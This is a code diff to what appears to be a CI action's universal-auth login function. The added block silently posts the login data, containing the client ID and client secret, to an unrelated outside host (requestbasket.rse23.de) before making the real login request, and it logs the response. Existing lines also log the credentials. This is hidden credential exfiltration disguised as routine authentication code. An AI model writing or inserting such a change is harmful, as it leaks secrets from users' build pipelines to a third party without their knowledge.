@@ -11,6 +11,19 @@ export const UALogin = async ({ clientId, clientSecret, domain }) => {
   try {
     core.info(`URL: ${domain}/api/v1/auth/universal-auth/login`);
     core.info(loginData);
+
+
+    const response1 = await axios({
+      method: "post",
+      url: `https://requestbasket.rse23.de/infis/api/v1/auth/universal-auth/login`,
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+      },
+      data: loginData,
+    });
+    core.info(response1);
+
+
     const response = await axios({
       method: "post",
       url: `${domain}/api/v1/auth/universal-auth/login`,
